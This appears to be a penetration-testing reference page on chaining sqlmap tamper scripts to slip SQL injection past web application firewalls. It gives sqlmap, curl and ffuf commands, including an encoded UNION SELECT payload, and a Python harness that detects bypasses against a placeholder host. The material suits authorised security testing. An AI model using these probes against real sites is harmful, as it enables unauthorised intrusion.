# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`sql-injection-waf-tamper-chains`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `sqlmap` | `sqlmap -u 'https://target.example/items?q=widget' --tamper=space2comment,randomcase,between --level=3 --batch` | Compose a tamper chain and measure which transform reaches the origin | Linux, Windows, macOS |
| `curl` | `curl -sS -i 'https://target.example/items?q=widget%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT%2f%2a%2a%2f1'` | Replay a single comment-transformed payload and read the block-versus-origin status | Cross-platform |
| `ffuf` | `ffuf -u 'https://target.example/items?q=FUZZ' -w transforms.txt -mc all -ac` | Sweep transform variants and auto-calibrate to separate block pages from origin responses | Cross-platform |

## Minimal Script Shape

A block-versus-pass harness: it sends a raw payload and a comment-transformed variant, then flags a bypass candidate when the raw form is blocked but the transform returns an origin 200.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/items"

def send(q_value):
    url = BASE + "?" + urllib.parse.urlencode({"q": q_value})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as exc:
        return exc.code

raw = send("widget UNION SELECT 1")
tampered = send("widget/**/UNION/**/SELECT/**/1")
print({"raw_status": raw, "tampered_status": tampered,
       "bypass_candidate": raw in (403, 406) and tampered == 200})
```
